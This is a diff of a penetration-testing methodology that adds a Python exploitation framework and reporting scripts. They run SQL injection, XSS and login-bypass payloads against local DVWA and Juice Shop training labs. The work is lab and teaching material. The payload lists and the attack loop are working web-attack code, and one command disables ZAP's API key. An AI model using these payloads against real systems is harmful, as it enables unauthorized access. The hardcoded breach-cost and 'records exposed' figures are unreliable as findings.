-affected_records = 250000    # 250K affected individuals
-violation_type = 'data_breach'
-mitigating_factors = {
-    'cooperation_level': 0.7,    # Good cooperation (70%)
-    'remediation_speed': 0.5,    # Moderate remediation speed (50%)
-    'first_violation': 1.0       # First violation (100% discount eligibility)
-}
-
-gdpr_fine = calculate_gdpr_fine(annual_turnover, affected_records, violation_type, mitigating_factors)
-
-print("GDPR Fine Calculation:")
-print(f"Base fine: €{gdpr_fine['base_fine']:,.2f}")
-print(f"Calculated fine: €{gdpr_fine['calculated_fine']:,.2f}")
-print(f"Final fine: €{gdpr_fine['final_fine']:,.2f}")
-```
-
-## Comprehensive Risk Assessment Implementation
-
-### Complete Implementation Script for Kali Linux
-
-```bash
-#!/bin/bash
-# Comprehensive Risk Assessment Script for Kali Linux
-# Usage: ./risk_assessment.sh <target_domain> <company_size> <industry>
-
-TARGET_DOMAIN="$1"
-COMPANY_SIZE="$2"
-INDUSTRY="$3"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-OUTPUT_DIR="risk_assessment_${TIMESTAMP}"
-
-if [ $# -ne 3 ]; then
-    echo "Usage: $0 <target_domain> <company_size> <industry>"
-    echo "Company sizes: small, medium, large, enterprise"
-    echo "Industries: financial, healthcare, retail, government, technology"
-    exit 1
-fi
-
-mkdir -p "$OUTPUT_DIR"
-cd "$OUTPUT_DIR"
-
-echo "Starting comprehensive risk assessment for $TARGET_DOMAIN"
-echo "Company size: $COMPANY_SIZE"
-echo "Industry: $INDUSTRY"
-echo "Results will be saved in: $OUTPUT_DIR"
-
-# Phase 1: Technical Assessment
-echo "Phase 1: Technical vulnerability assessment..."
-nikto -h "http://$TARGET_DOMAIN" -o "nikto_scan.html" -Format htm > /dev/null 2>&1
-echo "Nikto scan completed"
-
-# Phase 2: Generate risk assessment report
-cat > risk_assessment_report.py << 'EOF'
-#!/usr/bin/env python3
-import sys
-import json
-from datetime import datetime
-
-def generate_risk_report(domain, company_size, industry):
-    # Use the FAIR and churn models defined above
-    # This would integrate with actual scan results
-    
-    report = {
-        'assessment_date': datetime.now().isoformat(),
-        'target': domain,
-        'company_profile': {
-            'size': company_size,
-            'industry': industry
-        },
-        'risk_calculations': {
-            'fair_model': {},
-            'churn_impact': {},
-            'regulatory_costs': {}
-        }
-    }
-    
-    # Save report
-    with open('risk_assessment_report.json', 'w') as f:
-        json.dump(report, f, indent=2)
-    
-    print(f"Risk assessment report generated for {domain}")
+    print(f"✅ Enhanced validation report generated: {output_dir}/validation_report.html")
 
 if __name__ == "__main__":
-    generate_risk_report(sys.argv[1], sys.argv[2], sys.argv[3])
-EOF
+    main()
+```
 
-python3 risk_assessment_report.py "$TARGET_DOMAIN" "$COMPANY_SIZE" "$INDUSTRY"
+#### Step 4: Execute Phase 2 for Both Targets
+```bash
+# Make scripts executable
+chmod +x phase2_validation.sh
+chmod +x advanced_zap_validation.py
 
-echo "Risk assessment completed. Check $OUTPUT_DIR for results."
+# Install ZAP Python API if not already installed
+pip3 install python-owasp-zap-v2.4
+
+# Test DVWA
+echo "🔬 Starting DVWA validation..."
+python3 advanced_zap_validation.py http://127.0.0.1/dvwa/ ./temp_dvwa_zap/
+cp ./temp_dvwa_zap/validation_report.html scan-results/owasp-zap/dvwa/zap_dvwa_active_scan.html
+cp ./temp_dvwa_zap/zap_validation_report.html scan-results/owasp-zap/dvwa/zap_dvwa_passive_scan.html
+
+# Test Juice Shop
+echo "🔬 Starting Juice Shop validation..."
+python3 advanced_zap_validation.py http://localhost:3000 ./temp_juiceshop_zap/
+cp ./temp_juiceshop_zap/validation_report.html scan-results/owasp-zap/juice-shop/zap_juiceshop_active_scan.html
+cp ./temp_juiceshop_zap/zap_validation_report.html scan-results/owasp-zap/juice-shop/zap_juiceshop_api_scan.html
+
+# Clean up temporary directories
+rm -rf temp_*_zap/
+
+echo "✅ Phase 2 complete for both targets"
+echo "📁 DVWA ZAP Reports: scan-results/owasp-zap/dvwa/"
+echo "📁 Juice Shop ZAP Reports: scan-results/owasp-zap/juice-shop/"
 ```
 
 ---
 
-# 📚 Additional Resources and References
+# 🎯 Phase 3: Exploitation and Impact Demonstration
 
-## Professional Development
-- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/) (OWASP, 2021)
-- [Web Security Academy](https://portswigger.net/web-security) - Free online training
-- [SANS Web Application Security Courses](https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/)
+## Objective
+Manually exploit validated vulnerabilities to demonstrate real-world attack scenarios and quantify business impact through controlled proof-of-concept attacks.
 
-## Technical Documentation
-- [Burp Suite Professional Documentation](https://portswigger.net/burp/documentation)
+## Tool: Burp Suite Professional/Community
+
+### Methodology: Manual Exploitation and Impact Assessment
+
+#### Step 1: Burp Suite Configuration
+```bash
+# Create output directory
+mkdir -p pentest_results/phase3_exploitation
+cd pentest_results/phase3_exploitation
+
+# Start Burp Suite
+burpsuite &
+
+# Configure browser proxy: 127.0.0.1:8080
+# Import Burp CA certificate for HTTPS testing
+```
+
+#### Step 2: Manual Exploitation Framework
+```python
+#!/usr/bin/env python3
+# File: burp_exploitation_framework.py
+
+import json
+import requests
+from datetime import datetime
+import base64
+import urllib.parse
+
+class ExploitationFramework:
+    def __init__(self, target_url, burp_proxy=None):
+        self.target_url = target_url
+        self.session = requests.Session()
+        self.exploits = []
+        
+        if burp_proxy:
+            self.session.proxies.update({
+                'http': burp_proxy,
+                'https': burp_proxy
+            })
+    
+    def test_sql_injection(self, endpoint, parameter):
+        """Test SQL injection vulnerability"""
+        
+        payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "' UNION SELECT 1,2,3--",
+            "admin'--",
+            "' OR 1=1#"
+        ]
+        
+        results = []
+        
+        for payload in payloads:
+            try:
+                if endpoint.find('?') > -1:
+                    test_url = f"{endpoint}&{parameter}={urllib.parse.quote(payload)}"
+                else:
+                    test_url = f"{endpoint}?{parameter}={urllib.parse.quote(payload)}"
+                
+                response = self.session.get(test_url)
+                
+                # Check for SQL injection indicators
+                sql_indicators = [
+                    'mysql_fetch',
+                    'ORA-01756',
+                    'Microsoft OLE DB Provider',
+                    'syntax error',
+                    'mysql_num_rows',
+                    'SQLSTATE'
+                ]
+                
+                for indicator in sql_indicators:
+                    if indicator.lower() in response.text.lower():
+                        results.append({
+                            'payload': payload,
+                            'url': test_url,
+                            'evidence': indicator,
+                            'response_length': len(response.text),
+                            'status_code': response.status_code,
+                            'vulnerable': True
+                        })
+                        break
+                else:
+                    results.append({
+                        'payload': payload,
+                        'url': test_url,
+                        'response_length': len(response.text),
+                        'status_code': response.status_code,
+                        'vulnerable': False
+                    })
+                        
+            except Exception as e:
+                results.append({
+                    'payload': payload,
+                    'error': str(e),
+                    'vulnerable': False
+                })
+        
+        return results
+    
+    def test_xss(self, endpoint, parameter):
+        """Test Cross-Site Scripting vulnerability"""
+        
+        payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "\"><script>alert('XSS')</script>",
+            "'><script>alert('XSS')</script>"
+        ]
+        
+        results = []
+        
+        for payload in payloads:
+            try:
+                data = {parameter: payload}
+                
+                response = self.session.post(endpoint, data=data)
+                
+                # Check if payload is reflected
+                if payload in response.text:
+                    results.append({
+                        'payload': payload,
+                        'url': endpoint,
+                        'method': 'POST',
+                        'parameter': parameter,
+                        'reflected': True,
+                        'vulnerable': True,
+                        'response_length': len(response.text)
+                    })
+                else:
+                    results.append({
+                        'payload': payload,
+                        'reflected': False,
+                        'vulnerable': False
+                    })
+                        
+            except Exception as e:
+                results.append({
+                    'payload': payload,
+                    'error': str(e),
+                    'vulnerable': False
+                })
+        
+        return results
+    
+    def test_authentication_bypass(self, login_endpoint):
+        """Test authentication bypass techniques"""
+        
+        bypass_attempts = [
+            {'username': "admin'--", 'password': 'anything'},
+            {'username': "admin' OR '1'='1", 'password': 'anything'},
+            {'username': "admin", 'password': "' OR '1'='1"},
+            {'username': "admin' OR 1=1#", 'password': 'anything'},
+            {'username': "' OR '1'='1'--", 'password': 'anything'}
+        ]
+        
+        results = []
+        
+        for attempt in bypass_attempts:
+            try:
+                response = self.session.post(login_endpoint, data=attempt)
+                
+                # Check for successful login indicators
+                success_indicators = [
+                    'welcome',
+                    'dashboard',
+                    'logout',
+                    'admin panel',
+                    'profile'
+                ]
+                
+                # Check for failure indicators
+                failure_indicators = [
+                    'invalid',
+                    'incorrect',
+                    'failed',
+                    'error'
+                ]
+                
+                success_found = any(indicator.lower() in response.text.lower() 
+                                  for indicator in success_indicators)
+                failure_found = any(indicator.lower() in response.text.lower() 
+                                  for indicator in failure_indicators)
+                
+                if success_found and not failure_found:
+                    results.append({
+                        'username': attempt['username'],
+                        'password': attempt['password'],
+                        'success': True,
+                        'response_length': len(response.text),
+                        'status_code': response.status_code
+                    })
+                else:
+                    results.append({
+                        'username': attempt['username'],
+                        'password': attempt['password'],
+                        'success': False
+                    })
+                        
+            except Exception as e:
+                results.append({
+                    'username': attempt['username'],
+                    'password': attempt['password'],
+                    'error': str(e),
+                    'success': False
+                })
+        
+        return results
+    
+    def generate_exploitation_report(self, output_file):
+        """Generate comprehensive exploitation report"""
+        
+        report_data = {
+            'target': self.target_url,
+            'timestamp': datetime.now().isoformat(),
+            'exploits': self.exploits,
+            'summary': {
+                'total_tests': len(self.exploits),
+                'successful_exploits': len([e for e in self.exploits if e.get('successful', False)])
+            }
+        }
+        
+        with open(output_file, 'w') as f:
+            json.dump(report_data, f, indent=2)
+        
+        return report_data
+
+# Usage example
+def main():
+    framework = ExploitationFramework("http://127.0.0.1/dvwa/", "http://127.0.0.1:8080")
+    
+    # Test SQL injection
+    print("🎯 Testing SQL injection...")
+    sql_results = framework.test_sql_injection(
+        "http://127.0.0.1/dvwa/vulnerabilities/sqli/",
+        "id"
+    )
+    
+    # Test XSS
+    print("🎯 Testing XSS...")
+    xss_results = framework.test_xss(
+        "http://127.0.0.1/dvwa/vulnerabilities/xss_r/",
+        "name"
+    )
+    
+    # Test authentication bypass
+    print("🎯 Testing authentication bypass...")
+    auth_results = framework.test_authentication_bypass(
+        "http://127.0.0.1/dvwa/login.php"
+    )
+    
+    # Store results
+    framework.exploits.extend([
+        {'type': 'sql_injection', 'results': sql_results},
+        {'type': 'xss', 'results': xss_results},
+        {'type': 'auth_bypass', 'results': auth_results}
+    ])
+    
+    # Generate report
+    report = framework.generate_exploitation_report('exploitation_results.json')
+    print(f"✅ Exploitation report generated: exploitation_results.json")
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Step 3: Exploitation HTML Report Generator
+```python
+#!/usr/bin/env python3
+# File: generate_exploitation_report.py
+
+import json
+import sys
+from datetime import datetime
+
+def calculate_business_impact(exploit_type, success_count):
+    """Calculate business impact based on exploit type and success rate"""
+    
+    impact_models = {
+        'sql_injection': {
+            'base_cost': 4880000,  # $4.88M average breach cost
+            'description': 'Complete database compromise enabling unauthorized access to all customer data',
+            'regulatory_fine': 20000000,  # €20M GDPR maximum
+            'customer_impact': '500,000 customer records exposed',
+            'recovery_time': '6-12 months',
+            'reputation_damage': 'Severe - 35% customer churn expected'
+        },
+        'xss': {
+            'base_cost': 3200000,  # $3.2M incident response
+            'description': 'Session hijacking and account takeover attacks',
+            'regulatory_fine': 5000000,  # $5M in fines
+            'customer_impact': '50,000 user sessions compromised',
+            'recovery_time': '3-6 months',
+            'reputation_damage': 'High - 15% customer churn expected'
+        },
+        'auth_bypass': {
+            'base_cost': 2500000,  # $2.5M security overhaul
+            'description': 'Unauthorized administrative access to critical systems',
+            'regulatory_fine': 8000000,  # $8M in compliance violations
+            'customer_impact': 'Administrative systems compromised',
+            'recovery_time': '4-8 months',
+            'reputation_damage': 'High - Loss of enterprise customers'
+        }
+    }
+    
+    if exploit_type in impact_models:
+        model = impact_models[exploit_type]
+        # Scale impact based on success rate
+        multiplier = min(success_count / 10, 1.0) + 0.5  # 0.5-1.5 multiplier
+        
+        return {
+            'total_cost': int(model['base_cost'] * multiplier),
+            'regulatory_cost': int(model['regulatory_fine'] * multiplier),
+            'description': model['description'],
+            'customer_impact': model['customer_impact'],
+            'recovery_time': model['recovery_time'],
+            'reputation_damage': model['reputation_damage']
+        }
+    
+    return {
+        'total_cost': 1000000,
+        'regulatory_cost': 500000,
+        'description': 'Security vulnerability with potential business impact',
+        'customer_impact': 'Customer data potentially at risk',
+        'recovery_time': '2-4 months',
+        'reputation_damage': 'Moderate business impact'
+    }
+
+def generate_exploitation_html_report(exploit_data, output_file):
+    """Generate comprehensive HTML exploitation report"""
+    
+    target = exploit_data.get('target', 'Unknown')
+    timestamp = exploit_data.get('timestamp', datetime.now().isoformat())
+    exploits = exploit_data.get('exploits', [])
+    
+    # Calculate overall statistics
+    total_tests = sum(len(exploit.get('results', [])) for exploit in exploits)
+    successful_exploits = 0
+    
+    for exploit in exploits:
+        if exploit.get('type') == 'sql_injection':
+            successful_exploits += len([r for r in exploit.get('results', []) if r.get('vulnerable', False)])
+        elif exploit.get('type') == 'xss':
+            successful_exploits += len([r for r in exploit.get('results', []) if r.get('vulnerable', False)])
+        elif exploit.get('type') == 'auth_bypass':
+            successful_exploits += len([r for r in exploit.get('results', []) if r.get('success', False)])
+    
+    html_template = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 3: Exploitation Report</title>
+    <style>
+        body {{ font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
+        .header {{ background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
+        .header h1 {{ margin: 0; font-size: 2.5em; }}
+        .header p {{ margin: 10px 0 0 0; opacity: 0.9; }}
+        .critical-alert {{ background: #f8d7da; border: 2px solid #dc3545; padding: 20px; margin: 20px 0; border-radius: 8px; }}
+        .critical-alert h2 {{ color: #dc3545; margin: 0 0 15px 0; }}
+        .exploit-section {{ margin: 30px 0; }}
+        .exploit-header {{ background: #495057; color: white; padding: 15px; border-radius: 8px 8px 0 0; }}
+        .exploit-content {{ background: #f8f9fa; border: 1px solid #dee2e6; border-top: none; padding: 20px; border-radius: 0 0 8px 8px; }}
+        .payload {{ background: #e9ecef; border-left: 4px solid #6c757d; padding: 15px; margin: 10px 0; font-family: monospace; }}
+        .success {{ border-left-color: #dc3545; background: #f8d7da; }}
+        .failure {{ border-left-color: #6c757d; background: #e9ecef; }}
+        .business-impact {{ background: #fff3cd; border: 2px solid #ffc107; padding: 20px; margin: 20px 0; border-radius: 8px; }}
+        .financial-summary {{ background: linear-gradient(135deg, #dc3545 0%, #c0392b 100%); color: white; padding: 20px; border-radius: 8px; margin: 20px 0; }}
+        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0; }}
+        .stat-card {{ background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; padding: 20px; border-radius: 8px; text-align: center; }}
+        .stat-number {{ font-size: 2em; font-weight: bold; }}
+        .stat-label {{ opacity: 0.9; }}
+        .evidence {{ background: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 0.9em; }}
+        .proof {{ background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .proof code {{ color: #e83e8c; background: #fff; padding: 2px 5px; border-radius: 3px; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ Phase 3: Exploitation Report</h1>
+            <p>Target: {target} | Generated: {datetime.fromisoformat(timestamp.replace('Z', '+00:00')).strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+        
+        <div class="critical-alert">
+            <h2>🚨 CRITICAL SECURITY BREACH CONFIRMED</h2>
+            <p>Manual exploitation testing has confirmed <strong>{successful_exploits} active vulnerabilities</strong> that can be immediately exploited by attackers. These represent verified attack paths that pose imminent risk to business operations and customer data.</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">{total_tests}</div>
+                <div class="stat-label">Total Exploit Attempts</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{successful_exploits}</div>
+                <div class="stat-label">Successful Exploits</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{int((successful_exploits/total_tests)*100) if total_tests > 0 else 0}%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+        </div>
+"""
+
+    # Add exploit sections
+    for exploit in exploits:
+        exploit_type = exploit.get('type', 'unknown')
+        results = exploit.get('results', [])
+        
+        successful_count = 0
+        if exploit_type == 'sql_injection':
+            successful_count = len([r for r in results if r.get('vulnerable', False)])
+            section_title = "💉 SQL Injection Exploitation"
+        elif exploit_type == 'xss':
+            successful_count = len([r for r in results if r.get('vulnerable', False)])
+            section_title = "🔗 Cross-Site Scripting (XSS) Exploitation"
+        elif exploit_type == 'auth_bypass':
+            successful_count = len([r for r in results if r.get('success', False)])
+            section_title = "🔓 Authentication Bypass Exploitation"
+        else:
+            section_title = f"🎯 {exploit_type.replace('_', ' ').title()} Exploitation"
+        
+        # Calculate business impact
+        impact = calculate_business_impact(exploit_type, successful_count)
+        
+        html_template += f"""
+        <div class="exploit-section">
+            <div class="exploit-header">
+                <h2>{section_title}</h2>
+                <p>Successful Exploits: {successful_count}/{len(results)} | Success Rate: {int((successful_count/len(results))*100) if len(results) > 0 else 0}%</p>
+            </div>
+            <div class="exploit-content">
+                <div class="business-impact">
+                    <h3>💼 Business Impact Assessment</h3>
+                    <p><strong>Attack Capability:</strong> {impact['description']}</p>
+                    <p><strong>Customer Impact:</strong> {impact['customer_impact']}</p>
+                    <p><strong>Recovery Timeline:</strong> {impact['recovery_time']}</p>
+                    <p><strong>Reputation Damage:</strong> {impact['reputation_damage']}</p>
+                </div>
+                
+                <div class="financial-summary">
+                    <h3>💰 Financial Impact</h3>
+                    <p><strong>Direct Costs:</strong> ${impact['total_cost']:,}</p>
+                    <p><strong>Regulatory Fines:</strong> ${impact['regulatory_cost']:,}</p>
+                    <p><strong>Total Estimated Impact:</strong> ${impact['total_cost'] + impact['regulatory_cost']:,}</p>
+                </div>
+"""
+
+        # Add individual exploit results
+        for i, result in enumerate(results[:10]):  # Limit to first 10 results
+            if exploit_type == 'sql_injection':
+                success = result.get('vulnerable', False)
+                payload_class = 'success' if success else 'failure'
+                status_text = "VULNERABLE" if success else "NOT VULNERABLE"
+                
+                html_template += f"""
+                <div class="proof">
+                    <h4>🔍 Exploit Attempt #{i+1}: {status_text}</h4>
+                    <div class="payload {payload_class}">
+                        <strong>Payload:</strong> <code>{result.get('payload', 'N/A')}</code><br>
+                        <strong>URL:</strong> {result.get('url', 'N/A')}<br>
+                        <strong>Response Length:</strong> {result.get('response_length', 'N/A')} bytes<br>
+                        <strong>Status Code:</strong> {result.get('status_code', 'N/A')}
+                    </div>
+                    {f'<div class="evidence"><strong>Evidence:</strong> {result.get("evidence", "See payload response")}</div>' if success else ''}
+                </div>
+"""
+            
+            elif exploit_type == 'xss':
+                success = result.get('vulnerable', False)
+                payload_class = 'success' if success else 'failure'
+                status_text = "XSS SUCCESSFUL" if success else "XSS BLOCKED"
+                
+                html_template += f"""
+                <div class="proof">
+                    <h4>🔍 XSS Attempt #{i+1}: {status_text}</h4>
+                    <div class="payload {payload_class}">
+                        <strong>Payload:</strong> <code>{result.get('payload', 'N/A')}</code><br>
+                        <strong>Parameter:</strong> {result.get('parameter', 'N/A')}<br>
+                        <strong>Method:</strong> {result.get('method', 'GET')}<br>
+                        <strong>Reflected:</strong> {'Yes' if result.get('reflected', False) else 'No'}
+                    </div>
+                </div>
+"""
+            
+            elif exploit_type == 'auth_bypass':
+                success = result.get('success', False)
+                payload_class = 'success' if success else 'failure'
+                status_text = "BYPASS SUCCESSFUL" if success else "BYPASS FAILED"
+                
+                html_template += f"""
+                <div class="proof">
+                    <h4>🔍 Auth Bypass Attempt #{i+1}: {status_text}</h4>
+                    <div class="payload {payload_class}">
+                        <strong>Username:</strong> <code>{result.get('username', 'N/A')}</code><br>
+                        <strong>Password:</strong> <code>{result.get('password', 'N/A')}</code><br>
+                        <strong>Status Code:</strong> {result.get('status_code', 'N/A')}<br>
+                        <strong>Response Length:</strong> {result.get('response_length', 'N/A')} bytes
+                    </div>
+                </div>
+"""
+
+        html_template += """
+            </div>
+        </div>
+"""
+
+    html_template += f"""
+        <div class="footer">
+            <p><strong>🔧 Methodology:</strong> Manual exploitation using Burp Suite Professional for proof-of-concept demonstration and business impact validation.</p>
+            <p><strong>📊 Report Scope:</strong> This report demonstrates actual exploitability of identified vulnerabilities through controlled testing.</p>
+            <p><strong>⚠️ Immediate Action Required:</strong> These vulnerabilities pose immediate risk and require emergency remediation.</p>
+            <p><strong>⚡ Report Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} using exploitation framework analysis.</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+    with open(output_file, 'w') as f:
+        f.write(html_template)
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python3 generate_exploitation_report.py <exploitation_results.json> <output_file.html>")
+        sys.exit(1)
+    
+    input_file = sys.argv[1]
+    output_file = sys.argv[2]
+    
+    with open(input_file, 'r') as f:
+        exploit_data = json.load(f)
+    
+    print("⚡ Generating exploitation report...")
+    generate_exploitation_html_report(exploit_data, output_file)
+    print(f"✅ Exploitation report generated: {output_file}")
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Step 4: Execute Phase 3 for Both Targets
+```bash
+# Make scripts executable
+chmod +x burp_exploitation_framework.py
+chmod +x generate_exploitation_report.py
+
+# Configure Burp Suite proxy in browser (127.0.0.1:8080)
+# Start Burp Suite and configure target scope
+
+echo "⚡ Starting DVWA exploitation..."
+# Run exploitation framework for DVWA
+python3 burp_exploitation_framework.py http://127.0.0.1/dvwa/
+
+# Generate DVWA exploitation reports
+python3 generate_exploitation_report.py exploitation_results.json scan-results/burp-suite/dvwa/burp_dvwa_security_scan.html
+
+# Copy results for website structure
+cp exploitation_results.json scan-results/burp-suite/dvwa/burp_dvwa_extensions.json
+
+echo "⚡ Starting Juice Shop exploitation..."
+# Update framework for Juice Shop
+sed -i 's|http://127.0.0.1/dvwa/|http://localhost:3000|g' burp_exploitation_framework.py
+
+# Run exploitation framework for Juice Shop
+python3 burp_exploitation_framework.py http://localhost:3000
+
+# Generate Juice Shop exploitation reports
+python3 generate_exploitation_report.py exploitation_results.json scan-results/burp-suite/juice-shop/burp_juiceshop_security_scan.html
+
+# Copy results for website structure
+cp exploitation_results.json scan-results/burp-suite/juice-shop/burp_juiceshop_manual_testing.json
+
+echo "✅ Phase 3 complete for both targets"
+echo "📁 DVWA Burp Reports: scan-results/burp-suite/dvwa/"
+echo "📁 Juice Shop Burp Reports: scan-results/burp-suite/juice-shop/"
+```
+
+### Website Integration Structure
+```bash
+# Final directory structure for website integration
+scan-results/
+├── nikto/
+│   ├── dvwa/
+│   │   ├── nikto_dvwa_basic.html
+│   │   ├── nikto_dvwa_comprehensive.html
+│   │   └── nikto_dvwa_ssl.html
+│   └── juice-shop/
+│       ├── nikto_juiceshop_basic.html
+│       └── nikto_juiceshop_comprehensive.html
+├── owasp-zap/
+│   ├── dvwa/
+│   │   ├── zap_dvwa_active_scan.html
+│   │   └── zap_dvwa_passive_scan.html
+│   └── juice-shop/
+│       ├── zap_juiceshop_active_scan.html
+│       └── zap_juiceshop_api_scan.html
+└── burp-suite/
+    ├── dvwa/
+    │   ├── burp_dvwa_security_scan.html
+    │   └── burp_dvwa_extensions.json
+    └── juice-shop/
+        ├── burp_juiceshop_security_scan.html
+        └── burp_juiceshop_manual_testing.json
+```
+
+---
+
+### Complete Three-Phase Workflow for Website Integration
+```bash
+#!/bin/bash
+# File: complete_website_integration.sh
+
+TARGET_DVWA="http://127.0.0.1/dvwa/"
+TARGET_JUICESHOP="http://localhost:3000"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+echo "🎯 Starting Complete Three-Phase Penetration Test Workflow"
+echo "=========================================================="
+
+# Create website-compatible directory structure
+mkdir -p scan-results/{nikto,owasp-zap,burp-suite}/{dvwa,juice-shop}
+mkdir -p docs scripts assets/{js,css,img}
+
+echo "🔧 Environment verification..."
+./verify_environment.sh
+
+# Phase 1: Reconnaissance (Nikto)
+echo ""
+echo "📊 Phase 1: Reconnaissance and Discovery"
+echo "========================================"
+
+echo "🔍 DVWA Nikto scanning..."
+nikto -h "$TARGET_DVWA" -o scan-results/nikto/dvwa/nikto_dvwa_basic.html -Format htm
+nikto -h "$TARGET_DVWA" -Plugins @@ALL -o scan-results/nikto/dvwa/nikto_dvwa_comprehensive.html -Format htm
+nikto -h "$TARGET_DVWA" -ssl -o scan-results/nikto/dvwa/nikto_dvwa_ssl.html -Format htm
+
+echo "🔍 Juice Shop Nikto scanning..."
+nikto -h "$TARGET_JUICESHOP" -o scan-results/nikto/juice-shop/nikto_juiceshop_basic.html -Format htm
+nikto -h "$TARGET_JUICESHOP" -Plugins @@ALL -o scan-results/nikto/juice-shop/nikto_juiceshop_comprehensive.html -Format htm
+
+# Phase 2: Validation (OWASP ZAP)
+echo ""
+echo "📋 Phase 2: Vulnerability Validation"
+echo "===================================="
+
+echo "🔬 Starting ZAP daemon..."
+zaproxy -daemon -port 8080 -config api.disablekey=true &
+ZAP_PID=$!
+sleep 30
+
+echo "🔬 DVWA ZAP scanning..."
+python3 advanced_zap_validation.py "$TARGET_DVWA" ./temp_dvwa_zap/
+cp ./temp_dvwa_zap/validation_report.html scan-results/owasp-zap/dvwa/zap_dvwa_active_scan.html
+cp ./temp_dvwa_zap/zap_validation_report.html scan-results/owasp-zap/dvwa/zap_dvwa_passive_scan.html
+
+echo "🔬 Juice Shop ZAP scanning..."
+python3 advanced_zap_validation.py "$TARGET_JUICESHOP" ./temp_juiceshop_zap/
+cp ./temp_juiceshop_zap/validation_report.html scan-results/owasp-zap/juice-shop/zap_juiceshop_active_scan.html
+cp ./temp_juiceshop_zap/zap_validation_report.html scan-results/owasp-zap/juice-shop/zap_juiceshop_api_scan.html
+
+# Stop ZAP
+kill $ZAP_PID
+rm -rf temp_*_zap/
+
+# Phase 3: Exploitation (Burp Suite)
+echo ""
+echo "🎯 Phase 3: Exploitation and Impact"
+echo "=================================="
+
+echo "⚡ DVWA exploitation testing..."
+python3 burp_exploitation_framework.py "$TARGET_DVWA"
+python3 generate_exploitation_report.py exploitation_results.json scan-results/burp-suite/dvwa/burp_dvwa_security_scan.html
+cp exploitation_results.json scan-results/burp-suite/dvwa/burp_dvwa_extensions.json
+
+echo "⚡ Juice Shop exploitation testing..."
+python3 burp_exploitation_framework.py "$TARGET_JUICESHOP"
+python3 generate_exploitation_report.py exploitation_results.json scan-results/burp-suite/juice-shop/burp_juiceshop_security_scan.html
+cp exploitation_results.json scan-results/burp-suite/juice-shop/burp_juiceshop_manual_testing.json
+
+# Generate master documentation
+echo ""
+echo "📑 Generating Master Documentation"
+echo "=================================="
+
+# Create methodology documentation
+cp enhanced_pentest_methodology.md docs/methodology.html
+
+# Generate website status update
+cat > assets/js/scan-status.js << 'EOF'
+// Update website status after scans complete
+const scanStatus = {
+    dvwa: {
+        nikto: { basic: true, comprehensive: true, ssl: true },
+        zap: { active: true, passive: true },
+        burp: { security: true, extensions: true }
+    },
+    juiceShop: {
+        nikto: { basic: true, comprehensive: true },
+        zap: { active: true, api: true },
+        burp: { security: true, manual: true }
+    },
+    lastUpdated: new Date().toISOString()
+};
+
+// Enable disabled buttons and update styling
+document.addEventListener('DOMContentLoaded', function() {
+    // Enable ZAP buttons
+    document.querySelectorAll('.action-btn[title="Coming Soon"]').forEach(btn => {
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+        btn.style.background = '';
+        btn.style.color = '#00ff88';
+        btn.removeAttribute('title');
+    });
+    
+    // Update last updated time
+    const lastUpdatedElement = document.getElementById('last-updated');
+    if (lastUpdatedElement) {
+        lastUpdatedElement.textContent = new Date().toLocaleString();
+    }
+    
+    // Update assessment status
+    const statusElement = document.querySelector('.terminal-footer span:last-child');
+    if (statusElement) {
+        statusElement.textContent = 'Assessment Complete: Phase 3/3 ✅';
+    }
+});
+EOF
+
+echo "✅ Complete three-phase penetration test workflow finished!"
+echo ""
+echo "📊 Website Integration Summary:"
+echo "==============================="
+echo "🎯 DVWA Assessment:"
+echo "   📁 Nikto: scan-results/nikto/dvwa/ (3 reports)"
+echo "   📁 ZAP: scan-results/owasp-zap/dvwa/ (2 reports)"
+echo "   📁 Burp: scan-results/burp-suite/dvwa/ (2 files)"
+echo ""
+echo "🎯 Juice Shop Assessment:"
+echo "   📁 Nikto: scan-results/nikto/juice-shop/ (2 reports)"
+echo "   📁 ZAP: scan-results/owasp-zap/juice-shop/ (2 reports)"
+echo "   📁 Burp: scan-results/burp-suite/juice-shop/ (2 files)"
+echo ""
+echo "📋 Documentation:"
+echo "   📁 Methodology: docs/methodology.html"
+echo "   📁 Scripts: scripts/ (all automation scripts)"
+echo ""
+echo "🌐 Website Integration:"
+echo "   All reports are now accessible through the terminal website"
+echo "   Copy scan-results/ directory to your website root"
+echo "   Copy assets/js/scan-status.js to enable all buttons"
+
+# Make executable
+chmod +x complete_website_integration.sh
+```
+
+### Execute Complete Integration
+```bash
